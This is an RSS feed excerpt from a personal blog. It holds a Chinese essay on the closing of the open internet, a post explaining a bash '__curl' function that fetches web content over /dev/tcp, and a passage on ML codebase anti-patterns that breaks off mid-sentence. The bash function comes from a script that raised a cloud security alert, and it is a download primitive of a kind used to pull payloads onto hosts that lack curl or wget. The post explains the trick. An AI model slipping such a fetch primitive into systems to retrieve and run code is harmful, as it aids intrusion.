      <content:encoded><![CDATA[<p >互联网正在变得不自由——这已经成为了一种共识。这种不自由是从获取内容的角度出发，我们依自己的意愿获取知识/资讯的难度在增加。「中文互联网已死」。优质资源被各大互联网巨头所垄断，人们只能从应用内部访问，并时常受到推荐算法的说教。在巨头领域之外的公网则是一片荒漠，充斥着大量低质量、重复的内容，让秉承自主意志前来探索的人心寒。而在世界其他地方，情况可能没有这么严重，但类似的现象如巨头垄断也是存在的。互联网并不像十几年前我们所憧憬的那样。</p><p >十几年前的我们是怎么描绘互联网的呢？一个很有年代感的说法是「互联网让世界变成地球村」。我们相信，互联网最终能将世界上所有人连接在一起。人们可以便捷地让自己的想法为世人所知，人们也可以便捷地获取别人发表的想法。那也是博客和搜索引擎兴起的时代。人们借博客发出自己的声音，利用搜索引擎探索被的站点，从而听到他人的声音。在那个时代，网络是开放、交流、求知的代名词。</p><p >搜索引擎无疑是一个伟大的发明。他就像一个近乎全知的守门人，守着世界上最大的书库。无论是谁有任何疑问，搜索引擎都能将其引导到对应的书前，为其解答。但现代人大多很少使用搜索引擎了。为了了解一件新鲜事，或是求解一个问题，他们首先会想到在应用里搜索，而不是去求助搜索引擎。这一方面是智能手机时代培养起的习惯，另一方面也是被逼无奈——书库的书正在减少，或者在腐烂。互联网巨头们纷纷筑起壁垒，将优质的内容限制在自己的范围内，再加上诸如内容农场 <sup id="fnref:1"><a href="#fn:1">1</a></sup> 一类的东西在作祟，公网上的有效信息越来越少。从全局来看，互联网正在走向割据与封闭。</p><p >上古时代的人们对互联网有着乌托邦般的幻想。他们倡导的是一种去中心化的虚拟空间 <sup id="fnref:2"><a href="#fn:2">2</a></sup>，被称为「互联网原教旨主义者」。这些人的构想源于他们的现实身份。互联网早期的用户多是有技术背景的 Geeks，或是有意愿探索新事物的人。他们都秉承着所谓的自由意志，是互联网上的住民，也是互联网内容的积极制造者。</p><p  class="nomargin"> 但随后资本的入场改变了一切。他们最初和原住民一样，在互联网的蛮荒之原上平起平坐。但随后，他们建立起了庞大的帝国，越来越多的人来到了互联网的世界。帝国之所以为帝国，与原住民的城邦有着本质的区别。他们的背后是资本家，为了最大化利益，他们发明了推荐算法，并封锁了边境。壁垒的形成使公网重新趋于荒芜，而推荐算法的出现则让帝国内的臣民失去自由意志。这些都让原教旨主义者们很是失望。</p><p  class="nomargin"> 互联网巨头的登场不是一件容易评价的事。他们的确做到了原教旨主义意志中的一部分，即让更多的人接触互联网，并降低了彼此交流的成本。这甚至深刻改变了商业、社会甚至国家的运作方式。但另一方面，维持这一切的运转需要巨大的能量。他们需要钱，从而发明了一些令人讨厌的东西。这些东西起初是为了最大化利益，但潜移默化改变了人们的生活方式乃至思维方式。</p><p >我不禁好奇，如果推动互联网发展的不是这些巨头，而是原教旨主义者会怎么样。他们缺乏巨大的能量，因此会发展得非常缓慢。但互联网能否始终保持开放的面貌？这也是存疑的。对于现如今发展成熟的互联网，有一描述是「网络是现实的投射和延伸」。随着越来越多的用户加入，互联网日渐壮大，成为一个不可忽视的实体，现实社会则开始投射其中。现实中的政治实体会介入，现实中的矛盾会在其中蔓延。互联网可能会再次变得中心化，或是有其他形式的缺陷。无论互联网是以何初衷创立，只要现实生产力不足以支持一个乌托邦的出现，那它永远不会成为一个乌托邦。</p><p >当然了，移动互联网终端的出现也是一个有趣的因素。移动终端促进了传播形式的演变。人们更倾向于在小屏设备上看简短的文字、图片或是视频，而不是长篇大论。这也促使移动互联网时代的内容形式向这个方向转移。传播形式的改变对于内容的生产者与消费者都有着深刻的影响，这点在电视时代就有所体现。生产者开始生产信息密度低的内容，这是传播形式决定的。而相较于纸媒与电视时代，移动互联网将生产者的角色下沉到了更为广泛的人群中，这也使得内容的质量降低。这是高质量内容被稀释的另一个原因。</p><p  class="nomargin"> 移动终端的另一个作用是促进了互联网形式的多样化。在上古时代，人们在互联网上能做的事有限，仅限于聊天、发表想法等几种。移动终端的便携性为其带来了更多的可能，我们可以在互联网中做许多贴近生活的事（当然网络介质的发展也必不可少）。人们在互联网中更多的是生活。原住民们所追求的理想主义范畴的东西，普通人少有顾及，就像在现实生活中那样。这也是「网络是现实的投射和延伸」的另一体现。倘若始终没有移动终端出现，如今的互联网可能会更加「严肃」，或者稍微符合原教旨主义。如果移动终端先于互联网出现，互联网的原教旨主义本身则可能发生变化。这些也是有趣的思考。</p><p  class="noindent"></p><blockquote><p  class="noindent"> 经历过这段美好岁月的老人像反刍动物似的不断把那段记忆吐出来，甜蜜地咀嚼，最后总是加上一句：“唉，那时咋就不懂得珍惜呢？”<cite>——《三体 2》</cite></p></blockquote><p  class="nomargin"> 原教旨主义者对如今的互联网感到失望，但出生在那之后的数字原住民 <sup id="fnref:3"><a href="#fn:3">3</a></sup> 会觉得这是互联网本来的面貌，并认为理所当然。原教旨主义者终将黯去，或许再没人讨论他们的历史，他们的努力，他们所秉承的信念。到那时，第一批互联网用户所构想的美好世界也便真正死去。</p><h3 id="相关阅读">相关阅读</h3><ul><li><a href="https://www.thecodedmessage.com/posts/web/">Open Internet, Closed Web</a></li></ul><div class="footnotes"><ol><li class="footnote" id="fn:1"><a href="https://en.wikipedia.org/wiki/Content_farm">Content Farm</a> </li><li class="footnote" id="fn:2">如果想了解他们的相关努力，可以参见<a href="https://en.wikipedia.org/wiki/Solid_%28web_decentralization_project%29">Solid (web decentralization project)</a> </li><li class="footnote" id="fn:3"><a href="https://en.wikipedia.org/wiki/Digital_native">Digital Native</a> </li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/internet-is-not-liberal/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Retrieve Contents over HTTP without curl or wget</title>
      <link>https://i.hsfzxjy.site/a-trick-to-retrieve-web-contents-without-curl-or-wget/</link>
      <guid>https://i.hsfzxjy.site/a-trick-to-retrieve-web-contents-without-curl-or-wget/</guid>
      <pubDate>Fri, 29 Oct 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;I came across a piece of interesting vulnerable script from a post on V2EX &lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;) on V2EX. A bas</description>
        
      
      
      
      <content:encoded><![CDATA[<p >I came across a piece of interesting vulnerable script from a post on V2EX <sup id="fnref:1"><a href="#fn:1">1</a></sup>) on V2EX. A bash function named <code>__curl</code> inside the file retrieves contents over HTTP as a simple alternative for command <code>curl</code> or <code>wget</code>, in scenarios where no such utilities available.</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><br><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__curl</span></span>() {</span><br><span class="line">  <span class="hljs-built_in">read</span> proto server path &lt;&lt;&lt;$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">${1//// }</span>)</span><br><span class="line">  DOC=/<span class="hljs-variable">${path// //}</span></span><br><span class="line">  HOST=<span class="hljs-variable">${server//:*}</span></span><br><span class="line">  PORT=<span class="hljs-variable">${server//*:}</span></span><br><span class="line">  [[ x<span class="hljs-string">&quot;<span class="hljs-variable">${HOST}</span>&quot;</span> == x<span class="hljs-string">&quot;<span class="hljs-variable">${PORT}</span>&quot;</span> ]] &amp;&amp; PORT=80</span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">exec</span> 3&lt;&gt;/dev/tcp/<span class="hljs-variable">${HOST}</span>/<span class="hljs-variable">$PORT</span></span><br><span class="line">  <span class="hljs-built_in">echo</span> -en <span class="hljs-string">&quot;GET <span class="hljs-variable">${DOC}</span> HTTP/1.0\r\nHost: <span class="hljs-variable">${HOST}</span>\r\n\r\n&quot;</span> &gt;&amp;3</span><br><span class="line">  (<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span></span><br><span class="line">   [[ <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> == $<span class="hljs-string">&#x27;\r&#x27;</span> ]] &amp;&amp; <span class="hljs-built_in">break</span></span><br><span class="line">  <span class="hljs-keyword">done</span> &amp;&amp; <span class="hljs-built_in">cat</span>) &lt;&amp;3</span><br><span class="line">  <span class="hljs-built_in">exec</span> 3&gt;&amp;-</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The function makes use of certain less known features of Linux and the Bash language.</p><p  class="noindent"> The first one is <strong>communicating over TCP through files</strong>. Linux employs a design philosophy of “everything are files”. One could find some special device files in directory <code>/dev</code>, through which we can manipulate the underlying devices. Specifically, manipulating a TCP socket connecting <code>$&#123;HOST&#125;:$&#123;PORT&#125;</code> could be achieved by accessing device file <code>/dev/tcp/$&#123;HOST&#125;/$&#123;PORT&#125;</code>. Since HTTP is a text-based protocol over TCP, working with it is no more difficult than reading / writing a text file. Line <code>exec 3&lt;&gt;$FILENAME</code> opens file <code>$FILENAME</code> under read-write mode and binds it to descriptor 3. The next line then manually composes an HTTP payload and writes out to <code>&amp;3</code>, which is in fact requesting the URL <code>http ://$&#123;HOST&#125;:$&#123;PORT&#125;</code>. By reading the same file descriptor, we retrieve the response content from the service. The trick serves as a primitive workaround for retrieving contents from web.</p><p  class="noindent"> Another one is <strong>parameter substitution in Bash</strong>. The expression <code>$&#123;var//PATTERN/REPL&#125;</code> substitutes <em>all</em> occurrences of <code>PATTERN</code> in <code>var</code> into <code>REPL</code>. If <code>REPL</code> omitted, the matched substrings will be deleted. For example, in this script, <code>$&#123;1//// &#125;</code> would replace all slashes <code>/</code> into white spaces in variable <code>$1</code>.</p><p  class="noindent"> References</p><ol><li><a href="https://tldp.org/LDP/abs/html/parameter-substitution.html">Parameter Substitution</a></li></ol><div class="footnotes"><ol><li class="footnote" id="fn:1">[收到条阿里云的告警，看不懂是做什么用的，请教一下 - V2EX](<a href="https://www.v2ex.com/t/811424">https://www.v2ex.com/t/811424</a></li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Bash/">Bash</category>
      
      
      <comments>https://i.hsfzxjy.site/a-trick-to-retrieve-web-contents-without-curl-or-wget/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Unravelling mocona] Part 1 - Verbosity or Anti-Pattern</title>
      <link>https://i.hsfzxjy.site/unravelling-mocona-verbosity-or-anti-pattern/</link>
      <guid>https://i.hsfzxjy.site/unravelling-mocona-verbosity-or-anti-pattern/</guid>
      <pubDate>Wed, 15 Sep 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;I was once working as an intern at MSRA around two years ago, at which I joined a research project and started developing upon a large c</description>
        
      
      
      
      <content:encoded><![CDATA[<p >I was once working as an intern at MSRA around two years ago, at which I joined a research project and started developing upon a large codebase. It’s a practice in ML research fields to adopt an existing code repository as codebase, instead of crafting everything from scratch. Such codebases usually come with convenient “infrastructures” <sup id="fnref:1"><a href="#fn:1">1</a></sup>, so researchers would not have to implement them once again, which could be time-wasting and error-prone. All we need is to write our models and losses, and put them into experiments.</p><p >The flow works just fine if you are proposing minor improvement on algorithms. The codebase provides an easy approach to prove and iterate your idea. But things would get worse if your work goes beyond it, especially touching the encapsulated infrastructures. Those convenient parts would constraint you and enforce your code into spaghetti.</p><p >At that time we were working on a new algorithm for image segmentation problem. The algorithm proposed a pipeline that is totally different from previous ones. To match it we had to introduce new data preprocessor as well as training scheme. The codebase, however, was designed for previous algorithms and presumed a traditional pipeline. It was as solid as a rock and we could hardly put our customization in.</p><p  class="nomargin"> We kept stuffing dozens of lines of code into the codebase. Most of them are badly-designed, repetitive and tightly coupled. We were at that time desperately catching up a conference deadline, applying every effort we had to figure out the optimal setting. Any irrelevant re-factoring would be considered time-consuming and risky. The development went on for months, and finally it grew up into a giant and terrifying monster. Here I would like to share two issues we’ve encountered.</p><hr><p >The first one happens in pairing a model with corresponding data loader. A traditional segmentation algorithm takes images (<code>img</code>) as input and is supervised by ground truth segmentation maps (<code>gtseg</code>). The data loader in codebase, therefore, default to yield a tuple of <code>(img, gtseg)</code> for each training iteration. Whereas in our method, the algorithm expects another two kinds of supervision <code>gtdist</code> and <code>gtoffset</code>, which requires totally different logic for loading and pre-processing.</p><p  class="nomargin"> Okay. So now we have two kinds of data loader, one for traditional methods, another for our method. We reserve a configuration entry <code>loader_type</code> for selecting a specific loader. The configuration would be firstly passed to a class <code>Trainer</code>, then to a <code>DataLoaderBuilder</code> to instantiate the chosen loader.</p><p  class="nomargin"> The class <code>Trainer</code> is fundamental in our program. It takes charge of all the instantiation for main components <sup id="fnref:2"><a href="#fn:2">2</a></sup>, and maintains the logic of training loop and evaluation. The design presents a hierarchy like</p><figure class="graphviz"><svg xmlns="http://www.w3.org/2000/svg" width="408" height="118pt" viewBox="0 0 306.49 118.23"><g class="graph"><path fill="none" d="M0 118.23V0h306.49v118.23z"/><g class="node" transform="translate(4 114.23)"><path fill="#fff5ee" stroke="#444" d="m168.52-78.78 2.49-.09 2.48-.13 2.43-.17 2.39-.21 2.34-.26 2.27-.29 2.2-.34 2.11-.37 2.03-.42 1.93-.45 1.82-.48 1.72-.52 1.6-.55 1.48-.58 1.36-.62 1.22-.64 1.1-.67.97-.69.84-.71.7-.74.56-.75.44-.77.3-.78.17-.8.05-.81-.08-.81-.19-.82-.32-.82-.42-.83-.54-.82-.63-.82-.73-.82-.83-.8-.91-.8-.99-.78-1.06-.77-1.14-.76-1.2-.73-1.26-.72-1.31-.69-1.37-.67-1.4-.64-1.45-.61-1.48-.58-1.51-.55-1.54-.52-1.56-.49-1.58-.45-1.6-.41-1.62-.37-1.63-.34-1.64-.29-1.64-.26-1.66-.21-1.66-.17-1.66-.13-1.66-.09-1.67-.04h-1.67l-1.67.04-1.66.09-1.67.13-1.66.17-1.65.21-1.65.26-1.64.29-1.62.34-1.62.37-1.6.41-1.58.45-1.57.49-1.53.52-1.52.55-1.48.58-1.44.61-1.41.64-1.36.67-1.31.69-1.26.72-1.2.73-1.14.76-1.06.77-1 .78-.91.8-.82.8-.73.82-.64.82-.53.82-.43.83-.31.82-.2.82-.07.81.04.81.18.8.3.78.43.77.57.75.7.74.84.71.96.69 1.1.67 1.23.64 1.36.62 1.48.58 1.6.55 1.71.52 1.83.48 1.93.45 2.02.42 2.12.37 2.2.34 2.27.29 2.33.26 2.39.21L156-79l2.47.13 2.5.09 2.51.04H166z"/><text x="164.74" y="-89.44" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">Trainer</text></g><g class="edge" transform="translate(4 114.23)"><path fill="none" stroke="#444" stroke-dasharray="5,2" d="M57.25-94.49h55.68"/><path fill="#444" stroke="#444" d="m112.89-97.99 10 3.5-10 3.5z"/><text x="90.73" y="-99.24" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">loader_type</text></g><g class="node" transform="translate(4 114.23)"><path fill="#fff5ee" stroke="#444" d="m100.01-.04 5.48-.09 5.41-.13 5.34-.17 5.24-.21 5.12-.26 4.97-.29 4.82-.34 4.63-.37 4.44-.42 4.23-.44 4-.49 3.75-.52 3.51-.55 3.25-.58 2.97-.62 2.69-.64 2.41-.66 2.12-.7 1.83-.71 1.53-.73 1.24-.76.95-.77.67-.78.38-.8.1-.81-.17-.81-.43-.82-.69-.82-.93-.83-1.17-.82-1.39-.82-1.6-.82-1.81-.8-1.99-.8-2.17-.78-2.34-.77-2.49-.76-2.63-.73-2.76-.72-2.88-.69-2.98-.66-3.08-.65-3.17-.61-3.24-.58-3.32-.55-3.37-.52-3.42-.49-3.47-.45-3.51-.41-3.53-.37-3.57-.34-3.59-.29-3.61-.26-3.62-.21-3.64-.17-3.64-.13-3.65-.09-3.66-.04h-3.65l-3.66.04-3.65.09-3.64.13-3.64.17-3.62.21-3.61.26-3.59.29-3.57.34-3.54.37-3.5.41-3.47.45-3.43.49-3.37.52-3.31.55-3.24.58-3.17.61-3.08.65-2.99.66-2.87.69-2.76.72-2.63.73-2.49.76-2.34.77-2.17.78-2 .8-1.8.8-1.6.82-1.4.82-1.16.82-.93.83-.69.82-.43.82-.17.81.1.81.38.8.66.78.95.77 1.25.76 1.53.73 1.83.71 2.12.7 2.41.66 2.69.64 2.97.62 3.25.58 3.5.55 3.76.52 4 .49 4.23.44 4.44.42 4.63.37 4.82.34 4.97.29 5.12.26 5.24.21 5.33.17L78-.13l5.48.09 5.5.04h5.52z"/><text x="91.74" y="-10.7" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">DataLoaderBuilder</text></g><g class="edge" transform="translate(4 114.23)"><path fill="none" stroke="#444" d="M151.01-79.05c-10.47 11-25.1 26.39-37.2 39.11"/><path fill="#444" stroke="#444" d="m116.38-37.57-9.43 4.83 4.36-9.65z"/><text x="156.99" y="-51.24" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">loader_type</text></g><g class="node" transform="translate(4 114.23)"><path fill="#fff5ee" stroke="#444" d="m240.26-.04 2.32-.09 2.3-.13 2.27-.17 2.22-.21 2.18-.26 2.11-.29 2.05-.34 1.97-.37 1.88-.42 1.8-.44 1.7-.49 1.59-.52 1.49-.55 1.38-.58 1.26-.62 1.15-.64 1.02-.66.9-.7.78-.71.65-.73.53-.76.4-.77.28-.78.16-.8.05-.81-.08-.81-.18-.82-.29-.82-.4-.83-.49-.82-.59-.82-.69-.82-.76-.8-.85-.8-.92-.78-.99-.77-1.06-.76-1.12-.73-1.17-.72-1.22-.69-1.27-.66-1.31-.65-1.35-.61-1.37-.58-1.41-.55-1.43-.52-1.46-.49-1.47-.45-1.49-.41-1.5-.37-1.52-.34-1.52-.29-1.54-.26-1.53-.21-1.55-.17-1.55-.13-1.55-.09-1.55-.04h-1.55l-1.56.04-1.55.09-1.54.13-1.55.17-1.54.21-1.53.26-1.53.29-1.51.34-1.5.37-1.49.41-1.48.45-1.45.49-1.43.52-1.41.55-1.38.58-1.34.61-1.31.65-1.27.66-1.22.69-1.17.72-1.12.73-1.06.76-.99.77-.92.78-.85.8-.77.8-.68.82-.59.82-.5.82-.39.83-.29.82-.19.82-.07.81.04.81.17.8.28.78.4.77.53.76.65.73.78.71.9.7 1.02.66 1.15.64 1.26.62 1.38.58 1.48.55 1.6.52 1.7.49 1.8.44 1.88.42 1.97.37 2.05.34 2.11.29 2.17.26 2.23.21 2.27.17 2.3.13 2.32.09 2.34.04h2.35z"/><text x="236.74" y="-10.7" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">Model</text></g><g class="edge" transform="translate(4 114.23)"><path fill="none" stroke="#444" d="M178.29-79.05c10.65 11.36 25.68 27.38 37.83 40.33"/><path fill="#444" stroke="#444" d="m218.66-41.13 4.29 9.68-9.39-4.89z"/></g></g></svg></figure><p  class="nomargin"> It should be alright when there’s only two kinds of loader. But things got complicated as the experiments proceed. During the months We’ve tried dozens of model designs for seeking an optimal one. Some of them should be fed with a combination of input that is different from the two before <sup id="fnref:3"><a href="#fn:3">3</a></sup>. More loaders popped out in support of those models. We began to mess up, since it was a tedious nightmare to keep <code>loader_type</code> in sync with the model in each configuration file.</p><hr><p >The second is a rather common problem in training models. Say you have designed a multi-stage training pipeline, where you would like the model to switch its behavior at some point. In the first X iterations, we disable a component A of model for warming up; while after that, it is enabled again for normal training. The catch is, how to make a deeply rooted component aware of the iteration number?</p><p  class="nomargin"> Back to our codebase. We had a <code>Trainer</code> in charge of everything. It starts a training loop, in which the iteration number lies as a local variable. It also holds a reference to the model. The model has a hierachical structure, and component A hides deeply in some layers.</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Trainer</span>:</span><br><span class="line">    model: <span class="hljs-string">&quot;Model&quot;</span></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">train</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-keyword">for</span> iter_num, data_batch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.data_loader):</span><br><span class="line">            self.model.forward(data_batch)</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Model</span>:</span><br><span class="line">    A: <span class="hljs-string">&quot;ComponentA&quot;</span></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, data_batch</span>):</span><br><span class="line">        ...</span><br><span class="line">        self.A.forward(data_batch)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ComponentA</span>:</span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, data_batch</span>):</span><br><span class="line">        <span class="hljs-comment"># How can I access iter_num?</span></span><br></pre></div></div><p  class="par"> The stuff was implemented in a rough way at that time – we add a second argument for both <code>Model.forward()</code> and <code>ComponentA.forward()</code>, and pass <code>iter_num</code> down along the path.</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Trainer</span>:</span><br><span class="line">    model: <span class="hljs-string">&quot;Model&quot;</span></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">train</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-keyword">for</span> iter_num, data_batch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.data_loader):</span><br><span class="line">            <span class="hljs-comment">#hl: begin</span></span><br><span class="line">            self.model.forward(data_batch, iter_num)</span><br><span class="line">            <span class="hljs-comment">#hl: end</span></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Model</span>:</span><br><span class="line">    A: <span class="hljs-string">&quot;ComponentA&quot;</span></span><br><span class="line">    <span class="hljs-comment">#hl: begin</span></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, data_batch, iter_num</span>):</span><br><span class="line">    <span class="hljs-comment">#hl: end</span></span><br><span class="line">        ...</span><br><span class="line">        self.A.forward(data_batch, iter_num)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ComponentA</span>:</span><br><span class="line">    <span class="hljs-comment">#hl: begin</span></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, data_batch, iter_num</span>):</span><br><span class="line">    <span class="hljs-comment">#hl: end</span></span><br><span class="line">        <span class="hljs-comment"># How can I access iter_num?</span></span><br></pre></div></div><p  class="nomargin"> Jesus it is dirty. The argument passing “contaminates” all functions it goes through. Whether or not expecting, they have to accept an extra argument. What if more components would like to access the states? What if more states would be passed? Every single change would have to modify a large area of code. Nobody would like it. At least I won’t.</p><hr><p >Now let’s move to a higher level for some deeper thoughts. In the first example, we choose to initiate model and data loader separately. The crux is, <em>they are not uncorrelated components</em>. The choice of model decides what shape input data would be like, and further determines the type of loader. We in fact have a graph like</p><figure class="graphviz"><svg xmlns="http://www.w3.org/2000/svg" width="329pt" height="118pt" viewBox="0 0 329.3 118.23"><g class="graph"><path fill="none" d="M0 118.23V0h329.3v118.23z"/><g class="node" transform="translate(4 114.23)"><path fill="#fff5ee" stroke="#444" d="m138.73-78.78 2.49-.09 2.48-.13 2.43-.17 2.39-.21 2.34-.26 2.27-.29 2.2-.34 2.11-.37 2.03-.42 1.93-.45 1.82-.48 1.72-.52 1.6-.55 1.48-.58 1.35-.62 1.23-.64 1.1-.67.97-.69.83-.71.7-.74.57-.75.44-.77.3-.78.17-.8.05-.81-.08-.81-.2-.82-.31-.82-.42-.83-.54-.82-.63-.82-.73-.82-.83-.8-.91-.8-.99-.78-1.07-.77-1.13-.76-1.2-.73-1.26-.72-1.32-.69-1.36-.67-1.4-.64-1.45-.61-1.48-.58-1.51-.55-1.54-.52-1.56-.49-1.58-.45-1.6-.41-1.62-.37-1.63-.34-1.64-.29-1.64-.26-1.66-.21-1.66-.17-1.66-.13-1.67-.09-1.66-.04h-1.67l-1.67.04-1.67.09-1.66.13-1.66.17-1.65.21-1.65.26-1.64.29-1.63.34-1.61.37-1.6.41-1.58.45-1.57.49-1.53.52-1.52.55-1.48.58-1.44.61-1.41.64-1.36.67-1.31.69-1.26.72-1.2.73-1.14.76-1.07.77-.99.78-.91.8-.82.8-.73.82-.64.82-.53.82-.43.83-.31.82-.2.82-.07.81.04.81.18.8.3.78.43.77.57.75.7.74.83.71.97.69 1.1.67 1.23.64 1.36.62 1.48.58 1.6.55 1.71.52 1.83.48 1.93.45 2.02.42 2.12.37 2.2.34 2.27.29 2.33.26 2.39.21 2.44.17 2.47.13 2.5.09 2.51.04h2.52z"/><text x="134.95" y="-89.44" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">Trainer</text></g><g class="node" transform="translate(4 114.23)"><path fill="#fff5ee" stroke="#444" d="m41.46-.04 2.33-.09 2.3-.13 2.27-.17 2.22-.21 2.18-.26 2.11-.29 2.05-.34 1.96-.37 1.89-.42 1.8-.44 1.69-.49 1.6-.52 1.49-.55 1.38-.58 1.26-.62 1.14-.64 1.03-.66.9-.7.77-.71.66-.73.52-.76.41-.77.28-.78.16-.8.04-.81-.07-.81-.18-.82-.29-.82-.4-.83-.49-.82-.59-.82-.69-.82-.76-.8-.85-.8-.92-.78-1-.77-1.05-.76-1.12-.73-1.17-.72-1.22-.69-1.27-.66-1.31-.65-1.35-.61-1.37-.58-1.41-.55-1.43-.52-1.46-.49-1.47-.45-1.49-.41-1.5-.37-1.52-.34-1.52-.29-1.54-.26-1.54-.21-1.54-.17-1.55-.13-1.55-.09-1.55-.04h-1.55l-1.56.04-1.55.09-1.54.13-1.55.17-1.54.21-1.53.26-1.53.29-1.51.34-1.51.37-1.48.41-1.48.45-1.45.49-1.43.52-1.41.55-1.38.58-1.34.61-1.31.65-1.27.66-1.22.69-1.17.72-1.12.73-1.06.76-.99.77-.92.78-.85.8-.77.8-.68.82-.59.82-.5.82-.39.83-.29.82-.19.82-.07.81.04.81.16.8.29.78.4.77.53.76.65.73.78.71.9.7 1.02.66 1.14.64 1.27.62 1.37.58 1.49.55 1.6.52 1.7.49 1.79.44 1.89.42 1.97.37 2.04.34 2.12.29 2.17.26 2.23.21 2.26.17 2.31.13 2.32.09 2.34.04h2.34z"/><text x="37.95" y="-10.7" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">Model</text></g><g class="edge" transform="translate(4 114.23)"><path fill="none" stroke="#444" d="M117.16-79.41c-15.23 12.05-37.32 29.52-54.3 42.96"/><path fill="#444" stroke="#444" d="M65.22-33.86 55.21-30.4l5.67-8.95z"/><text x="106.88" y="-51.24" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">initiate</text></g><g class="node" transform="translate(4 114.23)"><path fill="#fff5ee" stroke="#444" d="m240.22-.04 5.47-.09 5.42-.13 5.34-.17 5.24-.21 5.12-.26 4.97-.29 4.82-.34 4.63-.37 4.44-.42 4.23-.44 3.99-.49 3.76-.52 3.51-.55 3.24-.58 2.98-.62 2.69-.64 2.41-.66 2.12-.7 1.82-.71 1.54-.73 1.24-.76.95-.77.67-.78.38-.8.1-.81-.17-.81-.43-.82-.69-.82-.93-.83-1.17-.82-1.39-.82-1.6-.82-1.81-.8-1.99-.8-2.18-.78-2.33-.77-2.49-.76-2.63-.73-2.76-.72-2.88-.69-2.98-.66-3.08-.65-3.17-.61-3.24-.58-3.32-.55-3.37-.52-3.42-.49-3.47-.45-3.51-.41-3.54-.37-3.56-.34-3.59-.29-3.61-.26-3.63-.21-3.63-.17-3.65-.13-3.65-.09-3.65-.04h-3.66l-3.65.04-3.65.09-3.64.13-3.64.17-3.62.21-3.61.26-3.59.29-3.57.34-3.54.37-3.51.41-3.46.45-3.43.49-3.37.52-3.31.55-3.24.58-3.17.61-3.08.65-2.99.66-2.87.69-2.76.72-2.63.73-2.49.76-2.34.77-2.17.78-2 .8-1.8.8-1.61.82-1.39.82-1.16.82-.94.83-.68.82-.44.82-.16.81.1.81.38.8.66.78.95.77 1.25.76 1.53.73 1.83.71 2.12.7 2.41.66 2.69.64 2.97.62 3.24.58 3.51.55 3.76.52 4 .49 4.23.44 4.43.42 4.64.37 4.81.34 4.98.29 5.12.26 5.23.21 5.34.17 5.42.13 5.47.09 5.51.04h5.52z"/><text x="231.95" y="-10.7" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">DataLoaderBuilder</text></g><g class="edge" transform="translate(4 114.23)"><path fill="none" stroke="#444" d="M152.74-79.41c14.59 11.54 35.46 28.05 52.12 41.23"/><path fill="#444" stroke="#444" d="m206.76-41.14 5.67 8.95-10.02-3.46z"/><text x="203.88" y="-51.24" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">initiate</text></g><g class="edge" transform="translate(4 114.23)"><path fill="none" stroke="#444" stroke-dasharray="5,2" d="M75.36-15.75h57.29"/><path fill="#444" stroke="#444" d="m132.49-19.25 10 3.5-10 3.5z"/><text x="109.26" y="-20.5" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">loader_type</text></g></g></svg></figure><p  class="par"> Ideally, <code>DataLoaderBuilder</code> should “contact” with <code>Model</code> to obtain information required for building loader. But we couldn’t, due to the limitation from hierarchy. The only possible path for message passing is <code>Model</code> -&gt; <code>Trainer</code> -&gt; <code>DataLoaderBuilder</code>. It would however turns <code>Trainer</code> into a “god object”, passing messages around between its children. Having a god object is considered to be a bad practice <sup 